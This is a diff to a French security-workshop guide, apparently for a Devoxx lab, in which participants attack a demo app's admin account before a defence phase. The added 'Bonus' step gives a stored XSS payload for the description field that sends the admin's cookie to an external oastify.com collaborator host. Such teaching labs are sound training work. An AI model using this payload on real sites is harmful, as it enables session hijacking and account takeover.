@@ -131,7 +131,13 @@ fetch("http://localhost:8081/users/myprofile", {
 
 - Puis vous jouer le rôle de l'admin qui se connecte et qui se rend sur la page "les utilisateurs de l'application devoxx" via le bouton "Voir les utilisateurs"
 - Son mot de passe vient d'être modifié
-- Vous pouvez ensuite vous connecter en tant qu'administrateur
+- Vous pouvez ensuite vous connecter en tant qu'administrateur avec ce nouveau mot de passe
+
+- Bonus : Si vous souhaitez voler le cookie de l'admin voici une payload exemple que vous pouvez essayer dans le champ description
+
+```
+<script>var i=new Image;i.src="http://jzm0oi5fnwqhv62vx06zgbiay14wsygn.oastify.com?cookie="+document.cookie;</script>
+```
 
 ## Phase de défense
 
